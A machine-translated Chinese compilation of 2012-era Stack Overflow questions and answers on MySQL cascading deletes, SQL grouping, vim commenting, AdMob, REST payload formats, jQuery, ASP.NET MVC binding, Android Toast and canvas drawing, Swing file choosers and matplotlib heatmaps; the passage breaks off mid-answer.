我有一张桌子，比如说，以下列：

`Name`, `Parent Name`, `ID`

我们还假设父名称为 Null 的三个条目（意味着它们是最顶层的父） - F_one、G_one 和 H_one。

如果我想删除其中一个父母（G_one，为什么不呢？）的所有后代，这意味着 G_one 的所有孩子，那些孩子的所有孩子，以及那些孩子的孩子，依此类推，直到最终级别其中，该行`Name`不作为`Parent Name`任何其他条目的 a 存在。

是否可以轻松完成，也许只需一个查询？

奖励，有没有办法选择所有 G_one 血统，以便我可以随心所欲地操纵它？

可以假设：-没有孩子在父母之间共享

不能假设： - 离散甚至一致的子级别数量。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:30:16.673

正如@Marc B 的建议， a `FORIEGN KEY`with`ON DELETE CASCADE`可以实现这一点。

如果还没有，现在可以添加：

1.  如果`UNIQUE`对`Name`（我假设`PRIMARY`密钥 os `ID`）有限制，请跳过此步骤。如果没有，请创建它：

    ```
    ALTER TABLE tableX
      ADD CONSTRAINT unique_Name
        UNIQUE (Name) ; 
    ```

2.  如果上一步成功，请添加`FOREIGN KEY`：

    ```
    ALTER TABLE tableX
      ADD CONSTRAINT fk_Name_ParentName
        FOREIGN KEY (ParentName)
           REFERENCES tableX (Name)
           ON UPDATE CASCADE
           ON DELETE CASCADE ; 
    ```

3.  如果上一步成功，您现在可以使用一条语句删除行：

    ```
    DELETE
    FROM tableX
    WHERE ParentName = 'G_one' ; 
    ```

    这应该导致：`Y rows affected`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T21:15:31.460

我无法对此进行测试，但我认为这样的事情可能会奏效：

```
CREATE TRIGGER casc_del AFTER DELETE on tblName
FOR EACH ROW 
    DELETE FROM tblName 
    WHERE tblName.parent_name is not null 
    AND tblName.parent_name NOT IN (SELECT name FROM tblName) 
```

更多关于 MySQL 中的触发器可以在[这里](http://dev.mysql.com/doc/refman/5.0/en/triggers.html)找到。注意：此方法仅适用于 5.02 或更高版本。

# vim - 在 NERD_commenter 中取消注释一段代码后，它的缩进不正确

> ID：11917512
> 
> 赞同：1
> 
> 时间：2012-08-11T20:44:47.660
> 
> 标签：vim, plugins, indentation

我有一些python代码：

```
 _name = "football.player"
     _description = "Football Player"
     def age_calc(self, cr, uid, ids, fields, arg, context=None): 
```

当我通过按下`,cc`NERD_commenter 来评论它时，它看起来像这样：

```
 _name = "football.player"
#     _description = "Football Player"
#     def age_calc(self, cr, uid, ids, fields, arg, context=None): 
```

但是取消注释后，使用`,cu`它看起来像这样：

```
 _name = "football.player"
    _description = "Football Player"
    def age_calc(self, cr, uid, ids, fields, arg, context=None): 
```

为什么这个未注释的块看起来移动了 1 个空格而不是在其原始位置？以及如何解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T21:30:01.883

这可能是因为您使用了 5 个空格。您的 tabstop / shiftwidth 设置为多少？它可能试图将其缩进到一个合乎逻辑的标准 (4) 个空格，而不是一个疯狂的 (5) 个空格。

如果你真的想为一个制表符使用 5 个空格（你不这样做），你可以这样做，`:set shiftwidth=5`如果你没有它`:set tabstop=5``:set et`

# sql-server-2008 - 当我有重复的日期和时间值时，我想获得最早值的结果

> ID：11917514
> 
> 赞同：0
> 
> 时间：2012-08-11T20:44:50.673
> 
> 标签：sql-server-2008, date, duplicates

这是我的桌子：

```
DateOfPerformance   DateOfPerformance4Sort    userfullname
19/06/2012          2012-06-19 13:38:36.630   T Tes
**19/06/2012        2012-06-19 17:59:18.933   Zazon Rotem
19/06/2012          2012-06-19 13:21:18.770   Zazon Rotem**
05/07/2012          2012-07-05 09:50:20.437   Hazani Efrat
05/06/2012          2012-06-05 17:19:23.670   Mark Oded
11/07/2012          2012-07-11 17:37:20.490   Aviv Test
19/06/2012          2012-06-19 13:36:33.583   Roys Ady
05/07/2012          2012-07-05 09:50:20.497   T Rose 
```

如您所见，我有两行相同的`userfullname`唯一区别是`dateofperformance4sort`

我应该怎么做才能以最早的执行日期获得相同的结果？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T22:51:25.480

假设用户可以在不同的日子进行表演。. .

```
create table your_table (
  DateOfPerformance date not null,
  DateOfPerformance4Sort datetime not null,
  userfullname varchar(20) not null
);
insert into your_table values
('2012-06-19', '2012-06-19 13:38:36.630', 'T Tes'),
('2012-06-19', '2012-06-19 17:59:18.933', 'Zazon Rotem'),  -- Two more performances
('2012-06-19', '2012-06-19 13:21:18.770', 'Zazon Rotem'),  -- down below.
('2012-07-05', '2012-07-05 09:50:20.437', 'Hazani Efrat'),
('2012-06-05', '2012-06-05 17:19:23.670', 'Mark Oded'),
('2012-07-11', '2012-07-11 17:37:20.490', 'Aviv Test'),
('2012-06-19', '2012-06-19 13:36:33.583', 'Roys Ady'),
('2012-07-05', '2012-07-05 09:50:20.497', 'T Rose'),
('2012-07-19', '2012-07-19 11:21:18.770', 'Zazon Rotem'),
('2012-07-19', '2012-07-19 23:21:18.770', 'Zazon Rotem'); 
```

. . . 这只是一个简单的聚合查询。

```
select userfullname, DateOfPerformance, min(DateOfPerformance4Sort) DateOfPerformance4Sort
from your_table
group by userfullname, DateOfPerformance
order by userfullname, DateOfPerformance 
```

它从 Zazon Rotem 返回两行，因为他在两个不同的日期进行了表演。

```
Zazon Rotem 2012-06-19  June, 19 2012 13:21:18-0700
Zazon Rotem 2012-07-19  July, 19 2012 11:21:18-0700 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-12T14:58:20.460

解决这个问题的一种典型方法是为每个用户获取一个值，即使用 row_number()：

```
select t.DateOfperformance, DateOfPerformance4Sort, userfullname
from (select t.*,
             row_number() over (partition by userfullname order by DateOfPerformance4Sort
                               ) as seqnum
      from t
     ) a
where seqnum = 1 
```

这将为子查询中的每个用户的每个记录分配一个序号。然后它只选择第一个。

# objective-c - iOS 中的 AdMob 与 UIWebView

> ID：11917518
> 
> 赞同：0
> 
> 时间：2012-08-11T20:45:02.997
> 
> 标签：objective-c, ios, xcode, admob

我正在使用最新的 Xcode (4.4.1) 并为 iOS 5.1 开发。我正在使用 Apple 提供的底部标签栏界面。其中一个选项卡使用了一个 UIWebView，它利用了全屏空间。当我尝试添加 AdMob 提供的标准横幅时，它根本不添加横幅。我跟着：[https://developers.google.com/mobile-ads-sdk/docs/admob/fundamentals](https://developers.google.com/mobile-ads-sdk/docs/admob/fundamentals)。下面附上代码

关于.h

```
#import <UIKit/UIKit.h>
#import "GADBannerView.h"

@interface About : UIViewController <UIWebViewDelegate> {
    IBOutlet UIWebView *webView;

    // Declare one as an instance variable
    GADBannerView *bannerView_;
}

@property (nonatomic, retain) UIWebView *webView;

@end 
```

关于.m

```
#import "About.h"
#import "GADBannerView.h"
#import "GADRequest.h"
#import "constants.h"

@implementation About

@synthesize webView;
//@synthesize bannerView = bannerView_;

+ (void)initialize {
    // Set user agent (the only problem is that we can't modify the User-Agent later in the program)
    NSDictionary *dictionary = [[NSDictionary alloc] initWithObjectsAndKeys:UserAgent, @"UserAgent", nil];
    [[NSUserDefaults standardUserDefaults] registerDefaults:dictionary];
}

- (void)viewDidLoad {
    [super viewDidLoad];
    NSString *fullURL = ([IsBeta isEqualToString: @"true"]) ? @"http://beta.wouldyouratherapp.com/questions/index/0/1" : @"http://wouldyouratherapp.com/questions/index/0/1";
    NSURL *url = [NSURL URLWithString:fullURL]; NSURLRequest *requestObj = [NSURLRequest requestWithURL:url]; [webView loadRequest:requestObj];

    // Create a view of the standard size at the bottom of the screen.
    // Available AdSize constants are explained in GADAdSize.h.
    bannerView_ = [[GADBannerView alloc] initWithAdSize:kGADAdSizeBanner];

    // Specify the ad's "unit identifier." This is your AdMob Publisher ID.
    bannerView_.adUnitID = MyAdUnitID;

    // Let the runtime know which UIViewController to restore after taking
    // the user wherever the ad goes and add it to the view hierarchy.
    bannerView_.rootViewController = self;
    [self.view addSubview:bannerView_];

    // Initiate a generic request to load it with an ad.
    [bannerView_ loadRequest:[GADRequest request]];

}

- (void)viewDidUnload
{
    [super viewDidUnload];
    // Release any retained subviews of the main view.
}

@end 
```

是的，我已经添加了所有框架，并且 MyAdUnitID 已经在常量文件中定义，所以一切都应该正常工作，但我想我错过了一些东西。有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:34:18.487

如果要添加`bannerView_`，则必须`webView`相应降低高度，以便为`bannerView_`. 由于广告的来源看起来像是在 (0,0)，因此您可能希望在`adView:DidReceiveAd`: 回调中使用与此类似的内容：

```
webView.frame = CGRectMake (0, bannerView_.frame.size.height, webView.frame.size.width, webView.frame.size.height - bannerView_.frame.size.height); 
```

# php - Rest API 应该接受 POST 数组还是 JSON 字符串？

> ID：11917527
> 
> 赞同：17
> 
> 时间：2012-08-11T20:45:39.313
> 
> 标签：php, json, api, rest

我一直在阅读一些 REST 教程，其中一些说为了将数据发送到 REST API，您应该将发布数据作为数组发送，如下所示：

```
$data = array('foo' => 'bar');
$rest->post($data); 
```

然后还有其他人说您应该像这样发送 JSON 数据：

```
$data = array('foo' => 'bar');
$data = json_encode($data);
$rest->post($data); 
```

不确定是否有这样做的标准方法，或者是否可以，但是在设计 API 时通常推荐什么？

编辑：似乎有混乱。为了澄清，我同意 JSON 应该用于客户端消费，但这个问题是关于 SERVER 消费的。这意味着服务器应该接受来自其客户端的 JSON 或 POST 数据吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-11T21:13:32.770

如果您是创建 RESTful API 的人，这意味着您的应用程序是*服务器*并且正在接受请求，那么您的问题似乎令人困惑。您的应用程序不会发送任何`POST`数据；*客户*将向`POST`您发送数据。

话虽如此，拥有一个接受 JSON 编码请求的 API 是可能的，但实际上只对非常小众的场景有用。绝大多数客户端将以 POST`application/x-www-form-urlencoded`格式将数据发布到您的 API。PHP 在幕后为您处理这个问题，并将数据公开为`$_POST`超全局。

如果您正在谈论*响应*POST 请求，以及您应该使用什么格式，那么这将取决于*客户端*希望您发送的格式。客户端将在`Accept`标头中指定这一点，或者某些 API 允许它在 URL 中指定（例如`foo.com/some/thing/123.json`或`foo.com/some/thing/123/json`）。客户端不需要告诉你的应用程序它想要什么格式，所以你可以选择一个合理的默认值。如今，大多数 API 都将使用 JSON。

不过，我从未听说过能够理解序列化 PHP 数组格式的 API，所以我不知道您一直在阅读哪些资源，但我很确定您误解了他们的建议。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-14T18:36:01.570

实际上，我认为这是一个很好的问题。不知道为什么它被否决了。

此外，与我在一些评论中看到的相反，客户可以使用他想要的任何语言，而不仅仅是 javascript。并且知道使用哪种语言来“构建”请求并不是服务器的工作，只是该请求是有效的。如果您认为发出请求的实体实际上可以是另一台服务器（想想用于跨域发送 post 请求的代理服务器），这更有意义。

* * *

话虽如此，我个人认为服务器端使用 XML 或 JSON 会更好。主要原因是验证。

根据模式验证 XML 或 JSON 更容易。模式也可以公开，一个设计良好的模式可以自己描述网络服务。客户端甚至可以在将请求发送到服务器之前使用相同的模式来验证请求。

当然，传递 url 编码形式也是有效的。并且也可以在服务器端进行验证。所以我认为，在路上，这只是一个偏好问题。

另外，请查看 SO 中的此讨论，它涉及相同的主题：

[JSON 与表单 POST](https://stackoverflow.com/questions/8604717/json-vs-form-post)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-11T20:57:45.847

您应该考虑将使用 API 的客户端。HTML5\AJAX 客户端可能需要 JSON 数据，而其他客户端（Silverlight 或本机移动应用程序）可能更擅长使用 XML。

用于编写 REST API 的一个伟大的框架/平台是微软的 Web API（基于 ASP.NET MVC）。该产品继承了 WCF 框架并允许用户在 MVC 环境中编写 REST API。一个特点是它根据 HTTP Accept 标头选择序列化提供程序。

因此，如果客户端接受 application/json，他们将使用 JSON 格式的服务，如果接受 XML，他们将使用 XML 格式的服务。您还可以编写自己的对象序列化程序并将其插入框架。

更多信息：[http ://www.asp.net/web-api/overview/getting-started-with-aspnet-web-api/video-your-first-web-api](http://www.asp.net/web-api/overview/getting-started-with-aspnet-web-api/video-your-first-web-api)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-04T02:36:54.390

大多数情况下，您希望坚持接收 POST 数据，但我认为接收 json 数据确实有其用途，例如在批处理请求时。

[Facebook API 使用](https://developers.facebook.com/docs/reference/api/batch/)它。

你不需要做`file_get_contents('php//input')`。从 facebook 文档中，您可以执行以下操作：

curl -X POST "http://example.com/batch" -d 'batch={ "param" : 1, "param2" : "2"}'

然后在 PHP 代码中，如果您使用的是 PHP，您可以通过 $_POST 参数获取它并执行 json_decode。

```
var_dump($_POST);

array(1) {
  ["batch"]=>
  string(30) "{ "param" : 1, "param2" : "2"}"
}

var_dump(json_decode($_POST['batch'], true));

array(2) {
  ["param"]=>
  int(1)
  ["param2"]=>
  string(1) "2"
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-11T20:47:07.910

JSON 更有意义，因为它与语言无关，并且在 API 扩展时很有用。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-04-17T14:32:32.747

我目前正在开发一个`REST API`，我也在问自己同样的问题。经过一些研究，我发现这不是标准，完全取决于你。

您正在开发服务器端，因此您可以决定如何将数据发送给您。客户需要适应您的设计。

我个人选择直接在正文`POST`中接收所有`PUT`数据。`JSON`

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-12-08T23:24:02.553

重点是重用已经存在的 HTTP 实现。

HTTP 被构建为接受许多不同[的内容类型，您只需要在](https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.17 "https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.17")[headers](https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html "https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html")中指定您使用的内容类型。

接受各种格式并处理内容类型标头的 REST API 令人耳目一新。您可以从 HTML 网页提交 x-www-form-urlencoded 值或使用原始 JSON 发出 AJAX 请求，只要每个人都遵循协议，就不会产生混淆。

作为开发人员，您必须选择您的应用程序将提供的支持，因为您无法支持所有内容。通常它归结为您自己的环境的支持或便利——没有人想重新发明轮子。

许多在设计时考虑到构建 API 的框架在较低级别处理最流行的内容类型。他们还可以根据[“Accept”标头](https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.1 "https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.1")对响应数据进行编码。

实现你认为最先使用的任何东西，或者找到一个已经使用 HTTP 并为你处理所有这些的框架。

# javascript - 使用 setInterval 的动画问题

> ID：11917529
> 
> 赞同：0
> 
> 时间：2012-08-11T20:45:59.410
> 
> 标签：javascript, jquery

我通过单击红色的 div 将 div 向左移动 0px 动画。在 div 下方，随着 div 的移动，类被添加到 li 中，但类只添加到某些 li 而不是全部。

有没有其他逻辑可以解决这个问题？

小提琴 - [http://jsfiddle.net/AsfFQ/16/](http://jsfiddle.net/AsfFQ/16/)

下面是问题的图片 ![在此处输入图像描述](../Images/027029c84b8a2be46b1476be39697bb2.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:50:58.310

试试这个**[jsFiddle 示例](http://jsfiddle.net/j08691/AsfFQ/20/)**。

```
var pos;
var timer, selectLi = (function() {
    var $block = $('.block'),
        $container = $('.container'),
        $lis = $('.container ul li'),
        liWidth = $lis.width(),
        $selectedLi;
    return function() {
        pos = $block.offset().left - $container.offset().left;
        liNum = Math.round(pos / liWidth);
        // $selectedLi && $selectedLi.removeClass('selected');
        $selectedLi = $($lis.get(liNum));
        $('li.eligible').each(function() {
            if ($block.offset().left-3 <= $(this).offset().left) $(this).addClass('selected');
        });
    };
})();

$('.block').click(function() {
    timer = setInterval(selectLi, 30);
    $(this).animate({
        left: 0
    }, function() {
        clearInterval(timer);
    });
});

$('li').each(function() {
    $(this).addClass('eligible');
    if ($(this).offset().left > $('.block').offset().left) $(this).removeClass('eligible');
});​ 
```

这将设置符合条件的列表项，然后随着条形图的移动，将它们的位置与条形图的 tjat 进行比较，如果它们在范围内，则添加类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T08:05:35.217

你的小动画只需要一点代码。请参阅[jsfiddle 示例](http://jsfiddle.net/creativecouple/ZA5Er/)

```
var $block = $('.block'),
    start = $block.offset().left;

$block.one('click').animate({left: 0})
 .$('li').filter(function(){return $(this).offset().left<=start})
 .repeat(30).filter(function(){return $(this).offset().left>=$block.offset().left})
 .addClass('selected').unrepeat();
​ 
```

我正在使用这个插件[jquery-timing](http://creativecouple.github.com/jquery-timing/)。

* * *

这也适用于每次点击动画 100px 时，请参阅[另一个小提琴](http://jsfiddle.net/creativecouple/eEH9Z/)：

```
var $block = $('.block');
$block.on('click').animate({left: '-=100px'})
 .$('li').filter(function(){return $(this).offset().left<=$block.offset().left})
 .repeat(30).filter(function(){return $(this).offset().left>=$block.offset().left})
 .addClass('selected').unrepeat(); 
```

玩得开心！

# javascript - MVC 将具有多种类型值的 JS 哈希表发布到 MVC 控制器中

> ID：11917533
> 
> 赞同：0
> 
> 时间：2012-08-11T20:46:57.327
> 
> 标签：javascript, asp.net-mvc, jquery

我有一个这样的 js 对象构建：

```
 var entity = new Object();
    entity["1"] = Property1.GetValue();
    entity["2"] = Property2.GetValue();
    entity["3"] = Property3.GetValue();
    entity["4"] = Property4.GetValue();
    entity["5"] = Property5.GetValue();
    entity["6"] = Property6.GetValue();
    entity["7"] = Property7.GetValue();
    entity["8"] = Property8.GetValue();
    entity["9"] = Property9.GetValue();
    entity["10"] = Property10.GetValue();
    entity["11"] = Property11.GetValue();
    entity["12"] = Property12.GetValue();
    entity["13"] = Property13.GetValue();
    entity["14"] = Property14.GetValue();
    entity["15"] = Property15.GetValue(); 
```

我像这样发布它：

```
 var data = JSON.stringify(
    {
        entityID: 1,
        data: entity
    });
    $.ajax({ 
            type: "POST",
            url: "/Entity/Update",
            data: data, 
            contentType: "application/json", 
            traditional: true,
            success: function (data) { 
                alert("koko");
            },
            error:function (xhr, ajaxOptions, thrownError) { 
                alert(xhr.status); 
                alert(ajaxOptions); 
                alert(thrownError); 
            }
    }); 
```

帖子是，但 MVC 控制器为 data 参数获取了一个空参数。

MVC方法：

```
 public void Update(int entityID, IDictionary<string, object> data) 
```

问题是值可以是不同的类型，而不仅仅是字符串或整数。那就是问题所在。有没有办法让默认模型绑定器正确读取对象，还是我必须编写自定义模型绑定器？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-12T20:11:39.973

我没有深入探讨为什么它在 MVC3 中不起作用（反序列化有问题？），但我在 MVC4 中检查了它——一切正常。

如果您无法切换到 MVC4，我的建议是重构您的`data`对象。我不知道您的示例与您的实际问题有多接近，但您可以使用数组而不是字典 - 在任何情况下，您的字典键都是索引...

所以以下将在 MVC3 中工作：

```
var entity = [
    Property1.GetValue(),
    Property2.GetValue(),
    Property3.GetValue(),
    Property4.GetValue()
]; 
```

和

```
public void Update(int entityID, List<object> data) 
```

至于使用非原始类型作为`PropertyN.GetValue()`查看该文章的结果：[http ://www.dalsoft.co.uk/blog/index.php/2012/01/10/asp-net-mvc-3-improved-jsonvalueproviderfactory -使用-json-net/](http://www.dalsoft.co.uk/blog/index.php/2012/01/10/asp-net-mvc-3-improved-jsonvalueproviderfactory-using-json-net/)

本文中的技术允许您将自定义 JSON 对象反序列化为`dynamic`C# 类型。因此，您的操作方法将具有以下签名：

```
public void Update(int entityID, IDictionary<string, dynamic> data) 
```

# android - 异常块中的吐司不显示

> ID：11917537
> 
> 赞同：0
> 
> 时间：2012-08-11T20:47:13.583
> 
> 标签：android, toast, forceclose

在我的代码中，当服务器没有响应时，日志中会显示错误消息，但`Toast`catch 块中的消息不会显示。我也试过`getApplicationContext()`但没有帮助。当服务器没有响应时，我会强制关闭并显示消息“应用程序已意外停止。请稍后再试。”

```
package de.vogella.android.asyntask;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

public class ReadWebpageAsynTask extends Activity {
    private static final String LOG_TAG = null;

private TextView textView;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
 super.onCreate(savedInstanceState);
 setContentView(R.layout.main);
textView = (TextView) findViewById(R.id.TextView01);
}

private class DownloadWebPageTask extends AsyncTask<String, Void, String> {
@Override
 protected String doInBackground(String... urls) {
String response = "";
for (String url : urls) {
 DefaultHttpClient client = new DefaultHttpClient();
 HttpGet httpGet = new HttpGet(url);
 try {
 HttpResponse execute = client.execute(httpGet);
 InputStream content = execute.getEntity().getContent();

 BufferedReader buffer = new BufferedReader(
   new InputStreamReader(content));
 String s = "";
 while ((s = buffer.readLine()) != null) {
  response += s;
 }

} catch (Exception e) {
         Toast.makeText(ReadWebpageAsynTask.this, "error  server not responding
"     + e.getMessage().toString(),  Toast.LENGTH_LONG).show();

       Log.e(LOG_TAG, "Connection Error ", e);

 e.printStackTrace();
}
}
return response;
}

@Override
protected void onPostExecute(String result) {
textView.setText(result);

 }
}

public void readWebpage(View view) {
 DownloadWebPageTask task = new DownloadWebPageTask();
 task.execute(new String[] { "http://www.vogella.de" });

}
} 
```

这是logcat的输出

```
 08-12 03:11:28.856: W/dalvikvm(824): threadid=7: thread exiting with uncaught        
  exception (group=0x4001d800)
 08-12 03:11:28.876: E/AndroidRuntime(824): FATAL EXCEPTION: AsyncTask #1
 08-12 03:11:28.876: E/AndroidRuntime(824): java.lang.RuntimeException: An error
  occured while executing doInBackground()
08-12 03:11:28.876: E/AndroidRuntime(824):  at     
android.os.AsyncTask$3.done(AsyncTask.java:200)

08-12 03:11:28.876: E/AndroidRuntime(824):  at     
 java.util.concurrent.FutureTask$Sync.innerSetException(FutureTask.java:273)

   08-12 03:11:28.876: E/AndroidRuntime(824):   at     
 java.util.concurrent.FutureTask.setException(FutureTask.java:124)
08-12 03:11:28.876: E/AndroidRuntime(824):  at     
java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:307)
 08-12 03:11:28.876: E/AndroidRuntime(824):     at     
java.util.concurrent.FutureTask.run(FutureTask.java:137)
 08-12 03:11:28.876: E/AndroidRuntime(824):     at     
java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1068)
08-12 03:11:28.876: E/AndroidRuntime(824):  at 
java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:561)
 08-12 03:11:28.876: E/AndroidRuntime(824):     at    
 java.lang.Thread.run(Thread.java:1096)

 08-12 03:11:28.876: E/AndroidRuntime(824): Caused by: java.lang.RuntimeException:    
 Can't create handler inside thread that has not called Looper.prepare()
 08-12 03:11:28.876: E/AndroidRuntime(824):     at android.os.Handler.<init>    
 (Handler.java:121)
 08-12 03:11:28.876: E/AndroidRuntime(824):     at android.widget.Toast.<init>  
(Toast.java:68)
  08-12 03:11:28.876: E/AndroidRuntime(824):    at     
android.widget.Toast.makeText(Toast.java:231)
 08-12 03:11:28.876: E/AndroidRuntime(824):     at    

  08-12 03:11:28.876: E/AndroidRuntime(824):    at    
 android.os.AsyncTask$2.call(AsyncTask.java:185)
 08-12 03:11:28.876: E/AndroidRuntime(824):     at    
java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:305)
08-12 03:11:28.876: E/AndroidRuntime(824):  ... 4 more 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-11T21:26:22.330

我最好的猜测是 Asynctask 线程在显示吐司时完成。所以用

```
runOnUiThread(new Runnable(){
   @Override
   public void run() {
         Toast.makeText(ReadWebpageAsynTask.this,
         "error - server not responding" + e.getMessage().toString(),
         Toast.LENGTH_LONG).show();
   }
}); 
```

# java - Java Swing - 查找器文本框

> ID：11917545
> 
> 赞同：3
> 
> 时间：2012-08-11T20:48:35.270
> 
> 标签：java, swing, jfilechooser

我目前有一个 JFrame 应用程序，它使用 JTextField 来输入文件位置，如下面的代码所示。

```
 txtSource = new JTextField();
    txtSource.setToolTipText("/location/of/file/test.txt");
    txtSource.setText("/location/of/file/test.txt");
    txtSource.setBounds(16, 122, 412, 29);
    contentPane.add(txtSource);
    txtSource.setColumns(10); 
```

我想做的是允许用户在目录搜索中选择文件在本地计算机上的位置，并且该位置将填充到文本框中。

我在 JChooser 上找到了以下信息，但我不确定这是否可行，并希望获得有关如何实施的帮助。

```
String filename = File.separator+"tmp";
JFileChooser fc = new JFileChooser(new File(filename));

// Show open dialog; this method does not return until the dialog is closed
fc.showOpenDialog(frame);
File selFile = fc.getSelectedFile();

// Show save dialog; this method does not return until the dialog is closed
fc.showSaveDialog(frame);
selFile = fc.getSelectedFile(); 
```

提前致谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T20:53:02.243

利用

```
 int option = fc.showOpenDialog(frame);
    if (option == JFileChooser.APPROVE_OPTION) {
            txtSource.setText(fc.getSelectedFile().getAbsolutePath())
    } 
```

用选定的文件绝对文件位置填充文本字段

# python - 如何在 matplotlib 中用文本注释热图

> ID：11917547
> 
> 赞同：30
> 
> 时间：2012-08-11T20:48:47.597
> 
> 标签：python, numpy, matplotlib, scipy

我正在使用 matplotlib 绘制热图：

`plt.pcolor(rand(5,5))`

如何用绘制的实际数字注释热图？意思是在绘制的热图的每个单元格中，将与该单元格对应的值放入传递给的 5x5 矩阵中`pcolor`。谢谢。

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2012-08-11T22:10:18.663

没有自动功能可以做这样的事情，但您可以遍历每个点并将文本放在适当的位置：

```
import matplotlib.pyplot as plt
import numpy as np

data = np.random.rand(5, 4)
heatmap = plt.pcolor(data)

for y in range(data.shape[0]):
    for x in range(data.shape[1]):
        plt.text(x + 0.5, y + 0.5, '%.4f' % data[y, x],
                 horizontalalignment='center',
                 verticalalignment='center',
                 )

plt.colorbar(heatmap)

plt.show() 
```

![代码输出](../Images/9d8defb239998e42c153c57ae0c3c31f.png)

高温高压

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2015-11-17T05:20:54.273

seaborn 热图通过设置`annot=True`.

请参阅[此](http://stanford.edu/~mwaskom/software/seaborn/generated/seaborn.heatmap.html)示例。

# android - Android - 用于 onDraw 的预绘制画布

> ID：11917554
> 
> 赞同：4
> 
> 时间：2012-08-11T20:50:25.427
> 
> 标签：android, android-canvas, android-ui

我曾经在 onDraw 方法中的 ImageView 中进行绘图。但是，我了解到最好在 onDraw 之外绘制画布并在 onDraw 中更新画布。

我知道这显然是错误的（因为它不起作用）但是我将如何完成我想要做的事情：

```
@Override 
public void onDraw(Canvas c) {
  c = this.newCanvas;
  super.onDraw(c);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-12T08:03:22.183

```
 public class GameLoopThread extends Thread {
private GameView view;
private boolean running = false;

public GameLoopThread(GameView view) {
      this.view = view;
}

public void setRunning(boolean run) {
      running = run;
}

@Override
public void run() {

      while (running) {
             Canvas c = null;

             try {
                    c = view.getHolder().lockCanvas();
                    synchronized (view.getHolder()) {
                        if (c != null) {
                            view.onDraw(c);
                        }

                    }
             } finally {
                    if (c != null) {
                           view.getHolder().unlockCanvasAndPost(c);
                    }
             }

             try {

                           sleep(10);
             } catch (Exception e) {}
      }
}
} 
```

让那个线程然后在你的活动中做这样的事情

```
 @Override
public void onCreate(Bundle savedInstanceState) {
    requestWindowFeature(Window.FEATURE_NO_TITLE);
    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
    WindowManager.LayoutParams.FLAG_FULLSCREEN);
    super.onCreate(savedInstanceState);
    setContentView(new GameView(GameActivity.this));
} 
```

然后在 GameViewClass 中做这样的事情

```
 public class GameView extends SurfaceView {

   private SurfaceHolder holder;
   private GameLoopThread gameLoopThread;

   public GameView(Context context) {
         super(context);
         gameLoopThread = new GameLoopThread(this);
         holder = getHolder();
         holder.addCallback(new SurfaceHolder.Callback() {

                @Override
                public void surfaceDestroyed(SurfaceHolder holder) {
                       boolean retry = true;
                       gameLoopThread.setRunning(false);
                       while (retry) {
                              try {
                                    gameLoopThread.join();
                                    retry = false;
                              } catch (InterruptedException e) {
                              }
                       }
                }

                @Override
                public void surfaceCreated(SurfaceHolder holder) {
                       gameLoopThread.setRunning(true);
                       gameLoopThread.start();
                }

                @Override
                public void surfaceChanged(SurfaceHolder holder, int format,
                              int width, int height) {
                }
         });

   }

   @Override
   protected void onDraw(Canvas canvas) {
         //Do Drawing
   }
} 
```

这里重要的是线程手动自动重复调用 onDraw() 方法，并且您正在锁定画布，在其上绘图，然后发布它。如果您不需要超快的刷新率，那么您最好执行以下操作：

```
 @Override 
    public void onDraw(Canvas c) {
        c = this.getHolder().lockCanvas();
        if (c != null) {
           //draw on canvas
        }
        if (c != null) {
            this.getHolder().unlockCanvasAndPost(c);
        }
    } 
```

我只是不知道最后一点是否有效，从未测试过。此外，如果您想在 on draw 方法之外进行绘图，您可以在线程中运行更新（在画布上绘图），并且每次调用 onDraw 方法时检查 Canvas 是否已准备好邮政。例如，让您的线程有一个布尔值，一旦画布被拉动，它就会设置为 false，因此线程会为您绘制一个新的，但一旦完成绘制，将布尔值设置为 true。在 ondraw 方法中检查布尔值是否为真以及是否拉画布。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-01-16T21:10:43.750

画布只是绘制某物的手柄——您需要获取某物本身。您在 onDraw() 之外绘制的画布需要由位图支持。然后在 onDraw() 中，简单地将 Bitmap 绘制到提供的 Canvas 中：

```
Bitmap my_bitmap = null; /* this needs to be initialized whereever it is drawn into */
@Override
public void onDraw(Canvas c) {
   if (my_bitmap != null) {
